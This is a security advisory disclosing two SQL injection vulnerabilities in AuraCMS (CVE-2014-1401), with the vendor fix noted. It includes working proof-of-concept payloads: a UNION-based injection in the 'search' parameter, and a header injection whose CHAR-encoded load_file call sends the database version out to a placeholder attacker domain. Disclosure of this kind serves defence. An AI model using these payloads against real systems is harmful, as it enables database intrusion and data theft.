Advisory Details:

High-Tech Bridge Security Research Lab discovered two SQL injection vulnerabilities in AuraCMS, which can be exploited to alter SQL queries and execute arbitrary SQL commands in application's database.


1) Multiple SQL Injection Vulnerabilities in AuraCMS: CVE-2014-1401

1.1 The vulnerability exists due to insufficient validation of "search" HTTP GET parameter passed to "/index.php" script. A remote authenticated attacker can execute arbitrary SQL commands in application's database.

The exploitation example below displays version of MySQL server:

http://[host]/index.php?mod=content&action=search&search=1%27%29%2f**%2funion%2f**%2fselect%201,version%28%29,3,4,5,6,7,8,9,10,11,12,13,14,15%20--%202


1.2 The vulnerability exists due to insufficient validation of "CLIENT_IP", "X_FORWARDED_FOR", "X_FORWARDED", "FORWARDED_FOR", "FORWARDED" HTTP headers in "/index.php" script. A remote authenticated attacker can execute arbitrary SQL commands in application's database.

The exploitation example below displays version of MySQL server:


GET / HTTP/1.1
CLIENT_IP: '),('',(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))) -- 2


-----------------------------------------------------------------------------------------------

Solution:

Fixed by vendor on January 30, 2014 directly in the source code without version modification/new release. Update to the version 2.3 released after January 30, 2014.
